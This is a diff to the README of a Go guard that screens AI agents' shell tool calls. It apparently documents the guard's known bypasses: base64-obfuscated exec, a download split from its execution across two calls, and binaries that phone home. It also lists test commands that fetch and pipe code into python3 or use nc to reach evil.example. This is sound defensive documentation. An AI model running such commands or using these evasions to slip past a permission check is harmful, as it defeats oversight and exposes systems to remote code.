@@ -40,12 +40,18 @@ Residual bypasses (honest list):
 
 | Bypass | Why still open |
 |---|---|
-| Obfuscated interpreter code | no AST / decoder stage |
+| Obfuscated interpreter code (`exec(base64…)`) | no AST / decoder stage — covered by `TestAdversarial_HandChecks/residual_base64_exec_still_allows` |
+| Two tool calls: download, then run file | each call’s args look clean in isolation |
 | Allow then run a binary that phones home | args looked clean |
-| Secrets only in tool **output** | policy never sees results — wire `AfterToolRedact` |
-| Dual lists drift (Guard vs spawn) | you must wire `CommandLists()` (below) |
+| Secrets only in tool **output** | policy never sees results — wire `AfterToolRedact` (demo shows it) |
+| Dual lists drift (Guard vs spawn) | you must wire `CommandLists()` — see [DUAL_POLICY.md](DUAL_POLICY.md) |
 | `go test` ask-exemption | Kept for trusted local workflows (`test`/`fmt`/`vet`/`version`/`env`). `go test` still compiles and runs workspace-controlled code (`TestMain` / `init`). Callers must use a sandbox when the workspace is untrusted. |
 | Audit queue full | `AsyncAuditor` drops events (see `Dropped()`); permission decisions are never blocked for audit I/O |
+
+Hand-check denials (mentor paste tests): `curl … -o file && python3 file`,
+`bash -c 'wget … \| python3'`, `nc … evil.example` — see
+`TestAdversarial_HandChecks`.
+
 
 ## Issue 2002 mapping (partial on purpose)
 
@@ -89,6 +95,8 @@ Common rule ids (also land in audit / report):
 - `allow` (nothing matched)
 
 ## Dual policy with workspaceexec
+
+See **[DUAL_POLICY.md](DUAL_POLICY.md)** for the one-page diagram and wire-up.
 
 workspaceexec may also run `shellsafe` at spawn time. Guard is an earlier,
 argument-level pass. To keep one source of truth without importing
